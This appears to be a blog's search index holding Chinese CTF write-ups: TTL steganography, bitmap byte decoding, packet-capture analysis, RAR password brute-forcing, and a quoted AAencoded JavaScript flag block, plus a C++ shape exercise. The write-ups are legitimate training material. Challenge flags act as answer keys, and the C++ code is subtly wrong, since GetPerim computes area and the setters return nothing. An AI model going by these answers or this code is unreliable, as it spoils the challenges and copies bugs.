<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>安恒Misc</title>
    <url>/2019/12/15/AnHeng-Misc/</url>
    <content><![CDATA[<h2 id="奇怪的TTL字段"><a href="#奇怪的TTL字段" class="headerlink" title="奇怪的TTL字段"></a>奇怪的TTL字段</h2><p>TTL是 Time To Live的缩写，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。TTL是IPv4包头的一个8 bit字段。<br>压缩包里面有个ttl.txt，发现里面只有四种值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TTL=63</span><br><span class="line">TTL=127</span><br><span class="line">TTL=191</span><br><span class="line">TTL=255</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>对应的二进制为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00111111   63</span><br><span class="line">01111111   127</span><br><span class="line">10111111   191</span><br><span class="line">11111111   255</span><br></pre></td></tr></table></figure>
<p>只有前两位不同，就想着用它们二进制的前两位替换自身，然后转为16进制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">63     --&gt;   00</span><br><span class="line">127    --&gt;   01</span><br><span class="line">191    --&gt;   10</span><br><span class="line">255    --&gt;   11</span><br></pre></td></tr></table></figure>
<p>替换python代码如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ttl1 = open(<span class="string">'ttl.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = ttl1.readlines()</span><br><span class="line">ttl2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    ttl2.append(int(i[4:]))<span class="comment">#除去每行前缀的TTL=</span></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ttl2:</span><br><span class="line">    <span class="keyword">if</span> i == 63:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == 127:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == 191:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == 255:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line">binaryfile=open(<span class="string">"bin.txt"</span>,<span class="string">'w'</span>)<span class="comment">#将替换好的二进制数据写入bin.txt文件中</span></span><br><span class="line">binaryfile.write(s)</span><br><span class="line">binaryfile.close()</span><br></pre></td></tr></table></figure>
<p>将二进制转为16进制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ttl1 = open(<span class="string">'ttl.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = ttl1.readlines()</span><br><span class="line">ttl2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    ttl2.append(int(i[4:]))</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ttl2:</span><br><span class="line">    <span class="keyword">if</span> i == 63:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == 127:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == 191:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == 255:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line">import binascii</span><br><span class="line">hex1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(s),8):</span><br><span class="line">    hex1 += chr(int(s[i:i+8],2))</span><br><span class="line">hexfile=open(<span class="string">"hex.txt"</span>,<span class="string">'w'</span>)</span><br><span class="line">hexfile.write(hex1)</span><br><span class="line">hexfile.close()</span><br></pre></td></tr></table></figure>
<p>发现hex.txt文件中转好的16进制数据流是以ffd8开头的，可以想到应该是一张图片</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ttl1 = open(<span class="string">'ttl.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = ttl1.readlines()</span><br><span class="line">ttl2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    ttl2.append(int(i[4:]))</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ttl2:</span><br><span class="line">    <span class="keyword">if</span> i == 63:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == 127:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == 191:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == 255:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line">import binascii</span><br><span class="line">hex1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(s),8):</span><br><span class="line">    hex1 += chr(int(s[i:i+8],2))</span><br><span class="line">hex1 = binascii.unhexlify(hex1)</span><br><span class="line">picture = open(<span class="string">'zx.jpg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">picture.write(hex1)</span><br><span class="line">picture.close()</span><br></pre></td></tr></table></figure>
<p>得到zx.jpg，发现是一张残缺的二维码，上Kali，foremost一下，出来6张残缺的二维码照片，用P图软件将这六张照片拼接在一起，扫码得到一串字符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">key:AutomaticKey cipher:fftu&#123;2028mb39927wn1f96o6e12z03j58002p&#125;</span><br></pre></td></tr></table></figure>
<p>去谷歌搜了一下有个AUTOKEY<br>AUTOKEY解密地址：<a href="https://www.wishingstarmoye.com/ctf/autokey" target="_blank" rel="noopener">https://www.wishingstarmoye.com/ctf/autokey</a><br>解密后得到flag{2028ab39927df1d96e6a12b03e58002e}</p>
<h2 id="派大星的烦恼"><a href="#派大星的烦恼" class="headerlink" title="派大星的烦恼"></a>派大星的烦恼</h2><p>题目叙述：派大星最近很苦恼，因为它的屁股上出现了一道疤痕！我们拍下了它屁股一张16位位图，0x22，0x44代表伤疤两种细胞，0xf0则是派大星的赘肉。还原伤疤，知道是谁打的派大星！(答案为32位的一串字符串)<br>将图片用winhex打开，在中间发现了22和44，剩下的几乎都是F0</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>
<p>题目中说22和44代表伤疤两种细胞，F0是派大星的赘肉，赘肉也就是多余的，应该没用，有用的就是22和44，应该是二进制。22对应0，44对应1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">'22444422444422222222442244442222222222224444222222444422444422224422224444442222442244224444222222222222444422224422222222444422442244224444222222224422444422224422222244442222222222444444222222224422444422222244222222444422222244222244442244224422444422222244442222444422442244222244442222444422444422222244222222444422224444224444222244224422224444224422442244442222224422222244442222224422444422224444222222444422442244222244442222224422444422224444222244442222222222444444222244442222444422222244222244442222'</span></span><br><span class="line">str1=str1.replace(<span class="string">'22'</span>,<span class="string">'0'</span>)</span><br><span class="line">str1=str1.replace(<span class="string">'44'</span>,<span class="string">'1'</span>)</span><br><span class="line">str3=<span class="string">""</span></span><br><span class="line">tmp=<span class="string">""</span></span><br><span class="line">count=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    tmp=tmp+i</span><br><span class="line">    count=count+1</span><br><span class="line">    <span class="keyword">if</span> count==8:</span><br><span class="line">        str3=str3+tmp[-1::-1]</span><br><span class="line">        tmp=<span class="string">""</span></span><br><span class="line">        count=0</span><br><span class="line"><span class="built_in">print</span>(str3)</span><br></pre></td></tr></table></figure>
<p>刚开始将得到的二进制转为16进制，再转为ASCII码，发现是乱码，二进制的长度为256，而题目中说flag是32位的，256//32=8，所以可以猜想到每八位为一组，将每一组组内倒序，整体顺序不变，得到的二进制再转16进制，然后转ASCII码，拿到6406950a54184bd5fe6b6e5b4ce43832</p>
<h2 id="间谍启示录"><a href="#间谍启示录" class="headerlink" title="间谍启示录"></a>间谍启示录</h2><p>一个镜像文件，用UltraISO打开后，里面有一个systemzx.exe，点击运行，没有啥反应，还有个压缩包，打开后里面还有个systemzx.exe，安装后文解却被自动销毁了，唉。用360压缩打开，里面又有个flag.exe文件，点击运行依然没有任何效果，继续用360压缩打开，打开后没有发现任何有用的，返回上一级后，发现生成了一个机密文件.txt文本文件，打开后Flag{379:7b758:g7dfe7f19:9464f:4g9231}</p>
<h2 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h2><p>题目叙述：一黑客入侵了某公司盗取了重要的机密文件，还好管理员记录了文件被盗走时的流量，请分析该流量，分析出该黑客盗走了什么文件。<br>流量分析题，wireshark打开，在里面发现了flag.rar文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">49	1.588660	172.16.66.188	172.16.66.10	FTP	81	Request: RETR flag.rar</span><br><span class="line">55	1.601874	172.16.66.10	172.16.66.188	FTP-DATA	230	FTP Data: 164 bytes (PASV) (RETR flag.rar)</span><br></pre></td></tr></table></figure>
<p>追踪TCP流</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Rar!.....s..</span><br><span class="line">........)..F.....\...V..D....U....0.zeq..oGH...i....:.A.D.J...C.ekm..D.......^+%...p..Q&#125;...K..:5.<span class="comment">#.:.........Q.%....gi$..~0..yg.)..F...:_+U.MQs..c..2W&lt;</span></span><br></pre></td></tr></table></figure>
<p>看到Rar,显然是rar压缩文件，保存为16进制，用winhex打开，保存为rar文件，结果被加密了，直接爆破，密码为5790，拿到flag{6fe99a5d03fb01f833ec3caa80358fa3}</p>
<h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>题目叙述：公安机关近期截获到某网络犯罪团伙在线交流的数据包，但无法分析出具体的交流内容，聪明的你能帮公安机关找到线索吗？<br>流量分析题，wireshark打开</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">63	10.084277	172.16.66.100	172.16.80.120	TCP	54	1883 → 80 [ACK] Seq=386 Ack=1461 Win=65700 Len=0</span><br></pre></td></tr></table></figure>
<p>追踪TCP流，发现了一段base64编码,winhex打开,16进制开头是图片的文件头，把base64转图片即可拿到<br>flag{209acebf6324a09671abc31c869de72c}<br>base64转图片：<a href="http://tool.chinaz.com/tools/imgtobase/" target="_blank" rel="noopener">http://tool.chinaz.com/tools/imgtobase/</a><br>转之前要在base64编码前面加上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data:image/jpg;base64,</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
  </entry>
  <entry>
    <title>C++</title>
    <url>/2019/12/27/C++/</url>
    <content><![CDATA[<h2 id="抽象类与派生类"><a href="#抽象类与派生类" class="headerlink" title="抽象类与派生类"></a>抽象类与派生类</h2><p>定义一个抽象类Shape,在此基础上派生出矩形Rectangle和CircleL类，二者都有GetPerim()函数计算对象的周长，并编写main()函数。</p>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">class Shape//抽象类</span><br><span class="line">&#123;</span><br><span class="line">protected:</span><br><span class="line">    double len;</span><br><span class="line">    double width;</span><br><span class="line">    double r;</span><br><span class="line">public:</span><br><span class="line">    <span class="built_in">float</span> set1(<span class="built_in">float</span> x, <span class="built_in">float</span> y)</span><br><span class="line">    &#123;</span><br><span class="line">        len = x;</span><br><span class="line">        width = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">float</span> set2(<span class="built_in">float</span> x)</span><br><span class="line">    &#123;</span><br><span class="line">        r=x;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual <span class="built_in">float</span> GetPerim()=0;//定义纯虚函数，用来计算面积</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//定义一个矩形类</span><br><span class="line">class Rectangle :public Shape</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    <span class="built_in">float</span> GetPerim()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> len * width;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//定义一个圆形类</span><br><span class="line">class Circle :public Shape</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    <span class="built_in">float</span> GetPerim()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">float</span> pi=3.1415926;</span><br><span class="line">        <span class="built_in">return</span> pi*r*r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Rectangle Re;//定义一个矩形对象</span><br><span class="line">    Circle Cir; //定义一个圆形对象</span><br><span class="line">    Re.set1(5.5,6.5);</span><br><span class="line">    cout&lt;&lt;<span class="string">"矩形面积为："</span>&lt;&lt;Re.GetPerim()&lt;&lt;endl;</span><br><span class="line">    Cir.set2(10.1);</span><br><span class="line">    cout&lt;&lt;<span class="string">"圆形面积为："</span>&lt;&lt;Cir.GetPerim()&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解数独"><a href="#解数独" class="headerlink" title="解数独"></a>解数独</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>安恒Web</title>
    <url>/2019/12/14/AnHeng-Web/</url>
    <content><![CDATA[<h2 id="贪食蛇"><a href="#贪食蛇" class="headerlink" title="贪食蛇"></a>贪食蛇</h2><p>一个网页版贪吃蛇游戏，查看网页源代码，在snake.js文件中发现需要达到2500分才会出现flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (me.snakeLength &gt; 2500)</span><br><span class="line">&#123;ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [<span class="string">'_'</span>]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: <span class="string">'_'</span> ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +<span class="string">'_'</span>) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ <span class="string">'_'</span>)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +<span class="string">'_'</span>)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +<span class="string">'_'</span>) [c^_^o];(ﾟДﾟ) [<span class="string">'c'</span>] = ((ﾟДﾟ)+<span class="string">'_'</span>) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [<span class="string">'o'</span>] = ((ﾟДﾟ)+<span class="string">'_'</span>) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [<span class="string">'c'</span>]+(ﾟДﾟ) [<span class="string">'o'</span>]+(ﾟωﾟﾉ +<span class="string">'_'</span>)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +<span class="string">'_'</span>) [ﾟｰﾟ] + ((ﾟДﾟ) +<span class="string">'_'</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +<span class="string">'_'</span>) [ﾟΘﾟ]+((ﾟｰﾟ==3) +<span class="string">'_'</span>) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [<span class="string">'c'</span>]+((ﾟДﾟ)+<span class="string">'_'</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [<span class="string">'o'</span>]+((ﾟｰﾟ==3) +<span class="string">'_'</span>) [ﾟΘﾟ];(ﾟДﾟ) [<span class="string">'_'</span>] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +<span class="string">'_'</span>) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+<span class="string">'_'</span>) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +<span class="string">'_'</span>) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +<span class="string">'_'</span>) [ﾟΘﾟ]+ (ﾟωﾟﾉ +<span class="string">'_'</span>) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=<span class="string">'\\'</span>; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +<span class="string">'_'</span>)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=<span class="string">'\"'</span>;(ﾟДﾟ) [<span class="string">'_'</span>] ( (ﾟДﾟ) [<span class="string">'_'</span>] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ 